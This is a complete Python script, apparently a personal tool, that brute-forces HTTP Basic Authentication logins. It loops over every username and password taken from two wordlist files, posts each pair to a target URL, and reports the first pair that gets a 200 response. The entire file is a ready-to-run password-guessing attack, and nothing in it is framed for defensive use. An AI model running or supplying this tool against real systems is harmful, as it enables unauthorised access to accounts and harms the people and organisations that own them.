# Author: Musa ŞANA
# Date: 29.10.2017

import requests
from sys import argv
from requests.auth import HTTPBasicAuth

def main(*argv):
    if len(argv) < 1:
        print("\nUSAGE: BruteForceHBA.py <url> <username.txt> <password.txt>\n")
        quit()
    else:
        attack(argv[0], username(argv[1]), password(argv[2]))

def username(usernameList):
    with open(usernameList , "r") as u:
        username = u.read().splitlines()
    return username

def password(passwordList):
    with open(passwordList, "r") as p:
        password = p.read().splitlines()
    return password

def attack(url, username, password):
    print("TARGET: "+url)
    for user in username:
        for passw in password:
            req = requests.post(url, auth=HTTPBasicAuth(user, passw))
            if req.status_code == 200:
                print("-"*60, "\n[!] FOUND - Username: "+user+" Password: "+passw, "\n", "-"*60)
                quit()
            else:
                print("[*] ", req.status_code, "Username: "+user+" - Password: "+passw)

if __name__ == "__main__":
    main(*argv[1:])
